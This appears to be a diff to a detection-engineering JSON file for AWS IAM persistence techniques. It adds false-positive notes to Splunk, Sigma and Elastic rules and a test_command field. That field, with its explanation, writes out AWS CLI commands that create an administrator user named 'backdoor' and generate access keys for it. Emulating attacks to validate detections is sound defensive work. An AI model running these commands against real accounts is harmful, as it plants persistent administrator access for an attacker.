@@ -148,7 +148,8 @@
           "T1078.004"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate software installations, startup script changes by IT"
       },
       {
         "platform": "splunk",
@@ -161,7 +162,8 @@
           "T1078.004"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Automated cloud management tools, CI/CD pipelines, or authorized admin API calls"
       },
       {
         "platform": "sigma",
@@ -174,7 +176,8 @@
           "T1078.004"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate admin activity using the same Windows APIs or tools"
       },
       {
         "platform": "elastic",
@@ -186,7 +189,9 @@
           "T1098.001",
           "T1078.004"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Automated cloud management tools, CI/CD pipelines, or authorized admin API calls",
+        "confidence": "medium"
       }
     ],
     "visibility": {
@@ -216,7 +221,8 @@
         "Review AWS CloudTrail, Windows Security Event Log for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "aws --profile <profile> iam create-user --user-name backdoor\naws --profile <profile> iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws --profile <profile> iam create-access-key --user-name backdoor"
     }
   },
   "explain": "Creates a full-admin backdoor IAM user when you hold the right IAM write permissions:\n  iam create-user --user-name backdoor                              make a new user\n  iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess   grant it full admin\n  iam create-access-key --user-name backdoor                        mint programmatic keys for it\nGives persistent credential-based admin access independent of the compromised identity; requires iam:CreateUser/AttachUserPolicy/CreateAccessKey (check yours first with get-caller-identity + list-attached-user-policies)."
